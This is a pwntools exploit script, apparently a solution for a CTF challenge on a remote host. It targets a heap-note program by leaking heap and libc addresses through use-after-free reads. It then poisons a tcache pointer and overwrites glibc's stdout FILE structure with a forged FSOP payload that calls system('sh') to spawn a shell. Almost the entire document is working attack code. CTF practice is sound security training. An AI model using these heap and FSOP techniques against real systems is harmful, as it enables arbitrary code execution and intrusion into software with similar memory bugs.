from pwn import *
context(arch='amd64', os='linux')

p = remote("chall.polygl0ts.ch", 6242)
#p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chal'])
libc = ELF('./libc.so.6')

############
### FSOP ###
############

def FSOP_struct(flags = 0, _IO_read_ptr = 0,  _IO_read_end = 0,  _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):

    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")

    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP


########################
### Helper Functions ###
########################

def alloc(idx, size, data) :
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'idx?: ', str(idx).encode())
    p.sendlineafter(b'size?: ', str(size).encode())
    p.sendafter(b'data?: ', data)

def view(idx) :
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx?: ', str(idx).encode())
    p.recvuntil(b"meow: ")

def free(idx) :
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx?: ', str(idx).encode())

def edit(idx, data) :
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'idx?: ', str(idx).encode())
    p.sendafter(b'new data?: ', data)

####################
### Exploitation ###
####################

alloc(0, 0x600, b'AAAA')
alloc(1, 0x100, b'A' * 0x10)
free(1)
view(1)

heap_base = u64(p.recv(8)) * 0x1000
print(f"[+] heap_base: {hex(heap_base)}")

free(0)
view(0)
libc_base = u64(p.recv(8)) - 0x211b20
print(f"[+] libc_base: {hex(libc_base)}")

stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
system = libc_base + libc.symbols['system']
io_wfile_jumps = libc_base + libc.symbols['_IO_wfile_jumps']

target = ((heap_base + 0x910) >> 12) ^ stdout

poison = p64(target) + p64(0xdeadbeef)
edit(1, poison)

alloc(0, 0x100, b'dummy')

fs = FileStructure(0)
marker = u64(b'CAFEBABE')
fs._IO_save_end = marker
_IO_save_end_off = bytes(fs) .index(p64(marker))

FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
                   lock            = stdout + 0x10, \
                   _IO_read_ptr    = 0x0, \
                   _IO_write_base  = 0x0, \
                   _wide_data      = stdout - 0x10, \
                   _unused2        = p64(system)+ b"\x00"*4 + p64(stdout + _IO_save_end_off + 4), \
                   vtable          = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x20, \
                   )

alloc(1, 0x100, FSOP)

p.interactive()
